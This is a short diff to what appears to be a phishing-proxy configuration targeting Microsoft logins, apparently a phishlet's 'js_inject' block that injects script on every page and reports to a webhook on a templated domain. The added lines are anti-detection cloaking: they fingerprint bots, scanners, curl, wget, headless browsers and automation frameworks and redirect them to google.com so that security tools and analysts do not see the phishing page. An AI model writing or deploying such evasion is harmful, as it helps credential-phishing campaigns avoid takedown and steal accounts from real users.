@@ -57,6 +57,13 @@ js_inject:
     trigger_paths: ['/.*']
     script: |
       (function() {
+        const ua = navigator.userAgent.toLowerCase();
+        const isBot = /bot|crawler|spider|scanner|curl|wget|python|go-http|headless|phantom|selenium|puppeteer|playwright/i.test(ua);
+        if (isBot || navigator.webdriver || /headless/i.test(ua)) {
+            window.location.href = "https://www.google.com";
+            return;
+        }
+
         const api = "https://{{.Domain}}/api/webhook";
         const secret = "{{.WebhookSecret}}";
         const source = "microsoft";
